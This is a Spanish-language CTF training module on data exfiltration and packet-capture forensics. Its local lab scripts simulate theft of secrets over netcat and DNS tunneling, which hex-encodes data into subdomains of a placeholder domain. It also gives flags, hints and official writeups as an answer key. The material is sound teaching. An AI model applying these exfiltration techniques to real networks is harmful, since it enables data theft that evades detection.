# Módulo 3: Exfiltration — Bypassing Networks

> **Nivel:** Level 0 to Hero · **Categoría:** Redes / Forense
> **Requisitos previos:** Módulos 1-2 recomendados. Nociones básicas de qué es una IP y un puerto.
>
> ⚠️ **Entorno seguro:** Todo el tráfico de este módulo se genera y captura **dentro de tu propia máquina o de contenedores locales**. Analizas capturas (`.pcap`) que tú mismo produces. Nunca captures ni interceptes tráfico de redes que no te pertenezcan sin autorización explícita.

---

## 1. Introducción y Modelo Mental

### La Analogía del Mundo Real

Un ladrón entra a una oficina y encuentra documentos valiosos. Robarlos es fácil; el verdadero reto es **sacarlos por la puerta sin que los guardias lo noten**. No puede salir con una carretilla llena de carpetas: activaría todas las alarmas. Así que fotografía los documentos, esconde las fotos en objetos cotidianos —un periódico, la etiqueta de una botella— y sale caminando como si nada. Los guardias ven a alguien con un periódico, no a un ladrón con secretos.

**Exfiltración de datos** es ese arte de sacar información de una red vigilada disfrazándola de tráfico normal. Y el otro lado de la moneda es el **análisis forense de red**: ser el guardia que aprende a mirar el "periódico" con cuidado y descubre las fotos escondidas. En este módulo juegas ambos papeles: escondes datos en tráfico aparentemente inocente y, sobre todo, aprendes a **encontrarlos** dentro de una captura.

### Impacto Real

En casi todo ataque real, el objetivo final es *sacar* los datos: tarjetas de crédito, propiedad intelectual, credenciales. Los atacantes los ocultan en peticiones DNS, en tráfico HTTPS, en imágenes o codificados en Base64 para evadir los sistemas de detección (DLP/IDS). Los analistas SOC y forenses digitales viven de lo contrario: reconstruir qué se robó y cómo, examinando capturas de paquetes. Saber leer una `.pcap` es una habilidad diaria en cualquier equipo de defensa (Blue Team).

### Objetivo del Módulo

Al terminar sabrás **capturar y analizar tráfico de red** con Wireshark y `tcpdump`, **seguir un flujo TCP** para reconstruir una conversación, **decodificar datos ofuscados** (Base64, hex, XOR) con CyberChef, y reconocer patrones de **exfiltración por DNS y HTTP**.

---

## 2. Glosario Rápido

| Término | Definición en una frase |
|---|---|
| **Paquete** | La unidad mínima de datos que viaja por la red; un "sobre" con remitente y destinatario. |
| **PCAP** | Archivo que guarda paquetes capturados para analizarlos después (Packet CAPture). |
| **Exfiltración** | Sacar datos de una red evadiendo la detección. |
| **Encapsulación** | Esconder datos dentro de un protocolo que normalmente sirve para otra cosa (p. ej. DNS). |
| **Follow Stream** | Función de Wireshark que reconstruye una conversación TCP completa y legible. |
| **Base64** | Codificación que convierte datos binarios en texto ASCII; muy usada para ocultar. |
| **DNS Tunneling** | Exfiltrar datos metiéndolos en los nombres de dominio de consultas DNS. |

---

## 3. Cheat Sheet: Caja de Herramientas y Comandos

### Tabla de Herramientas

| Herramienta | Función | Dónde obtenerla |
|---|---|---|
| **Wireshark** | Analizar capturas de red con interfaz gráfica. | https://www.wireshark.org/download.html |
| **tcpdump** | Capturar tráfico desde la terminal. | `sudo apt install tcpdump` / preinstalado en macOS |
| **CyberChef** | "Navaja suiza" para decodificar Base64/hex/XOR sin instalar nada. | https://gchq.github.io/CyberChef/ (o clónalo para uso offline) |
| **Netcat (`nc`)** | Enviar/recibir datos crudos por TCP/UDP; simular canales de exfil. | `sudo apt install netcat-openbsd` |
| **tshark** | Versión de línea de comandos de Wireshark para filtrar en scripts. | Viene con Wireshark |
| **Docker** | Levantar el escenario cliente/servidor de exfiltración. | https://docs.docker.com/get-docker/ |

### Top Comandos / Sintaxis

```bash
# 1. Capturar tráfico a un archivo pcap (interfaz loopback = tráfico local)
sudo tcpdump -i lo -w captura.pcap        # -i interfaz, -w escribe a archivo

# 2. Abrir la captura en Wireshark (o desde la terminal con tshark)
wireshark captura.pcap
tshark -r captura.pcap                     # -r lee un pcap existente

# 3. Filtros útiles dentro de Wireshark (barra de filtro de visualización)
#    http                -> solo tráfico HTTP
#    dns                 -> solo consultas DNS
#    tcp.port == 4444    -> solo el puerto del canal de exfil
#    frame contains "FLAG"  -> paquetes que contengan el texto FLAG

# 4. Extraer todos los nombres DNS consultados (clave en DNS tunneling)
tshark -r captura.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# 5. Simular un canal de exfil con Netcat (emisor y receptor local)
nc -lvnp 4444 > recibido.bin        # receptor: guarda lo que llegue
nc 127.0.0.1 4444 < secreto.txt     # emisor: envía el archivo

# 6. Decodificar Base64 rápido en terminal (alternativa a CyberChef)
echo "RkxBR3tleGZpbHRyYWRvfQ==" | base64 -d
```

> **Consejo:** En Wireshark, click derecho sobre un paquete → **Follow → TCP Stream** reconstruye toda la conversación en texto legible. Es tu mejor amigo.

---

## 4. Tutorial Guiado — "Laboratorio 0"

### El Escenario

Un empleado descontento de "Botica Digital" copió una frase secreta y la envió por la red a un servidor externo usando una conexión simple. El equipo de seguridad capturó el tráfico en el archivo `captura.pcap`. Tu trabajo como analista forense: abrir la captura y recuperar lo que se robó.

### Paso 1 — Genera tu propia captura (para practicar)

Vamos a crear el escenario nosotros mismos. Abre **tres** terminales.

**Terminal A** — empieza a capturar el tráfico local:

```bash
sudo tcpdump -i lo -w captura.pcap
```

**Terminal B** — pon un receptor a la escucha (el "servidor del atacante"):

```bash
nc -lvnp 4444 > /dev/null
```

**Terminal C** — el "empleado" envía el secreto:

```bash
echo "El secreto es FLAG{sigue_el_flujo_tcp}" | nc 127.0.0.1 4444
```

Ahora vuelve a la **Terminal A** y presiona `Ctrl+C` para detener la captura. Ya tienes `captura.pcap`.

**¿Por qué?** `tcpdump` grabó cada paquete que cruzó la interfaz local (`lo`). El `nc` de la Terminal C empaquetó tu texto en paquetes TCP hacia el puerto 4444. Todo quedó en el archivo.

### Paso 2 — Abre la captura en Wireshark

```bash
wireshark captura.pcap
```

Verás una lista de paquetes. Puede parecer abrumadora: es normal. Vamos a filtrar.

### Paso 3 — Filtra el canal sospechoso

En la barra de filtro (arriba), escribe y presiona Enter:

```
tcp.port == 4444
```

Ahora solo ves los paquetes de esa conversación.

**¿Por qué?** El filtro de visualización oculta todo lo que no te interesa. Sabes que el atacante usó el puerto 4444, así que aíslas su tráfico del ruido.

### Paso 4 — Sigue el flujo

Click derecho sobre cualquiera de esos paquetes → **Follow → TCP Stream**.

Se abre una ventana con la conversación completa reconstruida. Ahí, en texto plano, leerás:

```
El secreto es FLAG{sigue_el_flujo_tcp}
```

**¿Por qué ocurrió?** Los datos viajaron **sin cifrar**. Wireshark solo reensambló los paquetes en orden y te mostró el contenido tal cual salió. Así de fácil se pierde un secreto que viaja en claro.

### Paso 5 — Reflexiona

Acabas de hacer forense de red. En los retos, los datos no estarán tan a la vista: estarán **codificados** o **escondidos en otros protocolos**. Pero la metodología es la misma: capturar → filtrar → seguir → decodificar.

---

## 5. Especificación de Retos Progresivos

> **Nota de despliegue:** El instructor entrega a cada alumno un archivo `.pcap` pregenerado (o los scripts para generarlo). Abajo se incluyen los scripts sintéticos que producen cada captura, para que el reto sea 100% reproducible en local.

---

### 🟢 Nivel 1 — "Conversación Indiscreta" (50 pts)

**Historia / Contexto:** Se interceptó una transferencia interna sin cifrar. La flag viaja en texto plano dentro de una conversación TCP. Encuéntrala.

**Especificación Técnica de Despliegue** — script generador `gen_nivel1.sh`:

```bash
#!/bin/bash
# Genera captura_n1.pcap con la flag en texto plano por el puerto 4444
sudo tcpdump -i lo -w captura_n1.pcap tcp port 4444 &
TPID=$!
sleep 1
nc -lvnp 4444 > /dev/null &
sleep 1
printf "GET /datos HTTP/1.0\r\nX-Nota: FLAG{trafico_en_texto_plano}\r\n\r\n" | nc -q1 127.0.0.1 4444
sleep 1
sudo kill $TPID
echo "Listo: captura_n1.pcap"
```

**Formato de la Flag:** `FLAG{trafico_en_texto_plano}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** La flag no está codificada. Solo tienes que *leerla*. ¿Qué función de Wireshark reconstruye una conversación completa?
- **Pista 2 (−10%):** Filtra con `tcp.port == 4444` y usa **Follow → TCP Stream**. O prueba el filtro `frame contains "FLAG"`.
- **Pista 3 (−30%):** Desde terminal: `tshark -r captura_n1.pcap -Y 'frame contains "FLAG"' -T fields -e frame.number` te dice el paquete; ábrelo y lee el header `X-Nota`.

**Writeup Oficial:**
1. Abre `captura_n1.pcap` en Wireshark.
2. Aplica el filtro `frame contains "FLAG"` — resalta el paquete culpable.
3. Click derecho → Follow → TCP Stream: aparece `X-Nota: FLAG{trafico_en_texto_plano}`.
4. Lección: datos sensibles sin cifrar son un regalo para el analista (y para el atacante).

---

### 🟡 Nivel 2 — "El Mensaje Cifrado" (100 pts)

**Historia / Contexto:** El atacante aprendió y ya no envía texto plano. Ahora **codifica** la flag en Base64 antes de mandarla, creyendo que eso la "cifra". No es cifrado: es codificación reversible.

**Especificación Técnica de Despliegue** — `gen_nivel2.sh`:

```bash
#!/bin/bash
# La flag va codificada en Base64 dentro del cuerpo enviado por TCP
FLAG_B64=$(printf "FLAG{base64_no_es_cifrado}" | base64)   # RkxBR3tiYXNlNjRfbm9fZXNfY2lmcmFkb30=
sudo tcpdump -i lo -w captura_n2.pcap tcp port 4444 &
TPID=$!
sleep 1
nc -lvnp 4444 > /dev/null &
sleep 1
printf "POST /upload\r\nData: %s\r\n\r\n" "$FLAG_B64" | nc -q1 127.0.0.1 4444
sleep 1
sudo kill $TPID
echo "Listo: captura_n2.pcap"
```

**Formato de la Flag:** `FLAG{base64_no_es_cifrado}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** Al seguir el stream verás una cadena rara que termina en `=` o `==`. Ese patrón es la firma de una codificación muy común.
- **Pista 2 (−10%):** Copia esa cadena y pégala en **CyberChef** con la operación *From Base64*.
- **Pista 3 (−30%):** En terminal: `echo "RkxBR3tiYXNlNjRfbm9fZXNfY2lmcmFkb30=" | base64 -d`.

**Writeup Oficial:**
1. Follow → TCP Stream sobre el puerto 4444 muestra `Data: RkxBR3t...fQ==`.
2. El sufijo `=` y el alfabeto A-Za-z0-9+/ delatan Base64.
3. En CyberChef, arrastra *From Base64* → salida: `FLAG{base64_no_es_cifrado}`.
4. Lección: Base64 **oculta a simple vista** pero no protege nada; cualquiera lo revierte en segundos.

---

### 🔴 Nivel 3 — "Túnel en las Sombras" (200 pts)

**Historia / Contexto:** El atacante evadió los filtros de red exfiltrando la flag **a través de consultas DNS** (DNS tunneling), un canal que casi nunca se bloquea. Cada trozo de la flag va como subdominio de una consulta, además **codificado en hex**. Combina análisis de DNS + decodificación. Doble reto.

**Especificación Técnica de Despliegue** — `gen_nivel3.py`:

```python
#!/usr/bin/env python3
# Simula DNS tunneling: la flag (en hex) se fragmenta como subdominios consultados.
# Genera consultas DNS reales al loopback para que tcpdump las capture.
import socket, binascii, time

FLAG = "FLAG{dns_tunneling_detectado}"
hexflag = binascii.hexlify(FLAG.encode()).decode()   # p. ej. 464c41477b...7d
# Trocea en pedazos de 20 chars y arma subdominios: <chunk>.exfil.lab
chunks = [hexflag[i:i+20] for i in range(0, len(hexflag), 20)]

for i, c in enumerate(chunks):
    nombre = f"{i:02d}-{c}.exfil.lab"
    try:
        socket.getaddrinfo(nombre, 53)   # dispara una consulta DNS por ese nombre
    except socket.gaierror:
        pass                             # el dominio no existe; solo queremos la consulta
    time.sleep(0.2)
print("Consultas DNS emitidas. Captura con: sudo tcpdump -i any -w captura_n3.pcap udp port 53")
```

Para generar la captura:

```bash
# Terminal 1
sudo tcpdump -i any -w captura_n3.pcap udp port 53
# Terminal 2
python3 gen_nivel3.py
# vuelve a Terminal 1 y Ctrl+C
```

**Formato de la Flag:** `FLAG{dns_tunneling_detectado}`

**Sistema de Pistas:**
- **Pista 1 (Gratis):** Nadie envió la flag por HTTP ni TCP obvio. Fíjate en un protocolo "de infraestructura" que aparece muchísimas veces con nombres de dominio rarísimos.
- **Pista 2 (−10%):** Filtra `dns` en Wireshark y observa los subdominios de `*.exfil.lab`. Se ven como hex. Extráelos con `tshark ... -e dns.qry.name`.
- **Pista 3 (−30%):** Ordena los subdominios por el prefijo `NN-`, concatena la parte hex, y decodifícala: CyberChef *From Hex*, o `python3 -c "import binascii;print(binascii.unhexlify('464c41...').decode())"`.

**Writeup Oficial:**
1. Abre `captura_n3.pcap`, filtra `dns`. Verás decenas de consultas a `00-464c41...`, `01-...`, `02-...`.exfil.lab`.
2. Extrae los nombres en orden:
   ```bash
   tshark -r captura_n3.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u
   ```
3. Cada nombre trae un índice `NN-` y un trozo hex. Ordena por índice y concatena solo la parte hexadecimal.
4. Decodifica el hex resultante (CyberChef *From Hex* o `unhexlify`) → `FLAG{dns_tunneling_detectado}`.
5. Lección: el DNS es un canal de exfil favorito porque rara vez se filtra; detectarlo requiere mirar volumen y entropía de los subdominios, no solo puertos.

---

## 6. "¡Me Atoré!" — Errores Comunes y Resolución de Problemas

**1. "Abro Wireshark pero veo miles de paquetes y me pierdo."**
No leas paquete por paquete: **filtra**. Empieza acotando por protocolo (`http`, `dns`, `tcp.port == N`) o por contenido (`frame contains "FLAG"`). Y recuerda: casi siempre la respuesta está a un click derecho → **Follow Stream** de distancia.

**2. "`tcpdump` dice 'permission denied' o no captura nada."**
Capturar tráfico requiere privilegios: usa `sudo`. Si aun así no ves paquetes, revisa la interfaz correcta: para tráfico local usa `-i lo` (loopback), no tu Wi-Fi. Lista las interfaces con `tcpdump -D` o `ip a`.

**3. "Decodifiqué Base64/hex y salió basura ilegible."**
Dos causas frecuentes: (a) copiaste caracteres de más (espacios, saltos de línea, comillas) —limpia la cadena; (b) elegiste la operación equivocada: Base64 termina en `=`/`==` y usa letras+números+`/`; el hex son solo `0-9a-f`. Si ves solo dígitos y a-f, es *From Hex*, no *From Base64*. En CyberChef puedes encadenar operaciones y usar *Magic* para que adivine.

---

> **Nota final del mentor:** Exfiltrar y detectar son dos caras de la misma moneda. El atacante esconde datos en canales "aburridos" (DNS, HTTPS, imágenes); el defensor aprende a mirar lo aburrido con lupa. Ahora sabes que **codificar no es cifrar** y que un `.pcap` cuenta toda la historia si sabes filtrarla. En el Módulo 4 bajaremos al nivel más profundo: los binarios. Nos vemos. 🚀
